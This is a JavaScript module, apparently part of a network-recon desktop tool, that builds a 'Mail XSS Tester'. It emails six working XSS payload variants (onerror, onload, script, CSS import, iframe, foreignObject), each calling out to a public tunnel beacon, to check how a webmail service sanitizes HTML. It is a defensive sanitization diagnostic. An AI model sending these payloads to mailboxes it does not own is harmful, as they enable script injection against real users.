(function () {
  // Mail XSS Tester: send yourself an email containing several HTML/XSS
  // payload variants, each proving execution by firing a request to a
  // unique beacon URL - a sanitized/stripped payload never runs, so it
  // never calls out. Every payload's ONLY effect is that beacon request
  // (no exfiltration, no persistence) - this is a sanitization diagnostic
  // for your OWN mailbox, not an attack tool. See src-tauri/src/main.rs's
  // own "Mail XSS Tester" comment block for the Rust side (beacon HTTP
  // listener + tunnel process + SMTP send).
  //
  // Detection needs a PUBLICLY reachable beacon endpoint - webmail
  // providers (Gmail in particular) fetch/proxy embedded images through
  // their own infrastructure, not from the recipient's machine, so a
  // plain localhost listener could never receive the hit. Cloudflare's
  // free, account-free Quick Tunnel bridges that - see startTunnel().

  var PAYLOADS = [
    { id: "img-onerror", labelKey: "mailXssPayloadImgOnerror" },
    { id: "svg-onload", labelKey: "mailXssPayloadSvgOnload" },
    { id: "svg-script", labelKey: "mailXssPayloadSvgScript" },
    { id: "css-import", labelKey: "mailXssPayloadCssImport" },
    { id: "iframe-src", labelKey: "mailXssPayloadIframeSrc" },
    { id: "foreignobject", labelKey: "mailXssPayloadForeignObject" },
  ];

  // Every variant's payload is "fire a request to beaconUrl" via whichever
  // vector it demonstrates - if a webmail's sanitizer strips the
  // attribute/tag, the fetch/import never happens and the payload simply
  // never reports in, which IS the useful signal (nothing to "clean up"
  // either way, and nothing here does more than call out).
  function buildPayloadHtml(id, beaconUrl) {
    var ping = "fetch('" + beaconUrl + "').catch(function(){})";
    switch (id) {
      case "img-onerror":
        return '<img src="https://invalid.example/x.png" alt="" onerror="' + ping + '" />';
      case "svg-onload":
        return '<svg onload="' + ping + '"></svg>';
      case "svg-script":
        return "<svg><script>" + ping + "</script></svg>";
      case "css-import":
        return '<style>@import "' + beaconUrl + '";</style>';
      case "iframe-src":
        return '<iframe src="' + beaconUrl + '"></iframe>';
      case "foreignobject":
        return '<svg><foreignObject><body xmlns="http://www.w3.org/1999/xhtml" onload="' + ping + '"></body></foreignObject></svg>';
      default:
        return "";
    }
  }

  function randomToken(len) {
    var chars = "abcdefghijklmnopqrstuvwxyz0123456789";
    var out = "";
    for (var i = 0; i < len; i++) out += chars.charAt(Math.floor(Math.random() * chars.length));
    return out;
  }

  function createMailXssTesterRuntime() {
    var selectedIds = PAYLOADS.map(function (p) { return p.id; });
    var tunnelStatus = "idle"; // idle | starting | running | error
    var tunnelUrl = "";
    var tunnelError = "";
    var hits = [];
    var unlistenHits = null;
    // A fresh random token per tunnel session, prefixed onto every beacon
    // path (/hit/<sessionToken>-<payloadId>) - the payload id alone stays
    // human-readable in the results table, but the full path isn't
    // trivially guessable by anyone else who might stumble onto the
    // short-lived public tunnel URL during the test window.
    var sessionToken = "";

    function emitChanged() {
      try {
        document.dispatchEvent(new CustomEvent("newui:mail-xss-tester-changed", {
          detail: { tunnelStatus: tunnelStatus, tunnelUrl: tunnelUrl, tunnelError: tunnelError, hits: hits.slice() }
        }));
      } catch (_) {
        // ignore event dispatch failures
      }
    }

    function getPayloads() {
      return PAYLOADS.slice();
    }

    function getSelectedPayloadIds() {
      return selectedIds.slice();
    }

    function setPayloadSelected(id, selected) {
      var idx = selectedIds.indexOf(id);
      if (selected && idx === -1) selectedIds.push(id);
      else if (!selected && idx !== -1) selectedIds.splice(idx, 1);
      emitChanged();
    }

    function getTunnelStatus() { return tunnelStatus; }
    function getTunnelUrl() { return tunnelUrl; }
    function getTunnelError() { return tunnelError; }
    function getHits() { return hits.slice(); }

    // Strips the per-session random prefix back off a hit's payload_id
    // (see the sessionToken comment above) so callers only ever deal in
    // plain payload ids, never the "<token>-<id>" wire format - kept here
    // rather than leaked into the renderer, since sessionToken is this
    // module's own private state.
    function getTriggeredPayloadIds() {
      var prefix = sessionToken + "-";
      var triggered = {};
      hits.forEach(function (h) {
        var pid = (h && h.payload_id) || "";
        if (pid.indexOf(prefix) === 0) triggered[pid.slice(prefix.length)] = true;
      });
      return Object.keys(triggered);
    }

    function ensureHitListener() {
      if (unlistenHits) return;
      var platform = window.NetReconNewUICore && window.NetReconNewUICore.platform;
      if (!platform || typeof platform.listen !== "function") return;
      Promise.resolve(platform.listen("mail-xss-beacon-hit", function (hit) {
        if (!hit) return;
        hits.push(hit);
        emitChanged();
      })).then(function (unlistenFn) {
        unlistenHits = unlistenFn;
      });
    }

    function startTunnel() {
      var platform = window.NetReconNewUICore && window.NetReconNewUICore.platform;
      if (!platform) return;
      tunnelStatus = "starting";
      tunnelError = "";
      hits = [];
      sessionToken = randomToken(16);
      ensureHitListener();
      emitChanged();

      Promise.resolve(platform.invoke("start_beacon_server", {})).then(function (port) {
        return platform.invoke("start_tunnel", { method: "cloudflare", localPort: port });
      }).then(function (url) {
        tunnelUrl = url;
        tunnelStatus = "running";
        emitChanged();
      }).catch(function (err) {
        tunnelStatus = "error";
        tunnelError = (err && err.message) ? err.message : String(err);
        // The beacon listener may have started even if the tunnel step
        // failed (e.g. cloudflared missing) - stop it too, no orphaned
        // local listener left behind after a failed start.
        Promise.resolve(platform.invoke("stop_beacon_server", {})).catch(function () {});
        emitChanged();
      });
    }

    function stopTunnel() {
      var platform = window.NetReconNewUICore && window.NetReconNewUICore.platform;
      if (!platform) return;
      Promise.resolve(platform.invoke("stop_tunnel", {})).catch(function () {});
      Promise.resolve(platform.invoke("stop_beacon_server", {})).catch(function () {});
      tunnelStatus = "idle";
      tunnelUrl = "";
      tunnelError = "";
      emitChanged();
    }

    function buildEmailHtml() {
      var payloadsById = {};
      PAYLOADS.forEach(function (p) { payloadsById[p.id] = p; });
      return getSelectedPayloadIds().map(function (id) {
        var beaconUrl = tunnelUrl + "/hit/" + sessionToken + "-" + id;
        return "<p>" + id + "</p>" + buildPayloadHtml(id, beaconUrl);
      }).join("\n<hr/>\n");
    }

    // Credentials (gmailAddress doubles as the SMTP username, appPassword)
    // are read straight from opts at call time and forwarded directly to
    // the Rust command - never stored on this module or anywhere else,
    // same one-time, read-at-use-only discipline as the remote-install/RDP
    // password fields built earlier.
    function sendTestEmail(opts) {
      var platform = window.NetReconNewUICore && window.NetReconNewUICore.platform;
      if (!platform) return Promise.reject(new Error("platform unavailable"));
      if (tunnelStatus !== "running") return Promise.reject(new Error("tunnel not running"));
      return platform.invoke("send_test_email", {
        gmailAddress: opts.gmailAddress,
        appPassword: opts.appPassword,
        to: opts.to,
        subject: opts.subject,
        htmlBody: buildEmailHtml(),
      });
    }

    return {
      getPayloads: getPayloads,
      getSelectedPayloadIds: getSelectedPayloadIds,
      setPayloadSelected: setPayloadSelected,
      getTunnelStatus: getTunnelStatus,
      getTunnelUrl: getTunnelUrl,
      getTunnelError: getTunnelError,
      startTunnel: startTunnel,
      stopTunnel: stopTunnel,
      getHits: getHits,
      getTriggeredPayloadIds: getTriggeredPayloadIds,
      sendTestEmail: sendTestEmail,
    };
  }

  window.NetReconNewUICore = window.NetReconNewUICore || {};
  window.NetReconNewUICore.mailXssTester = createMailXssTesterRuntime();
})();
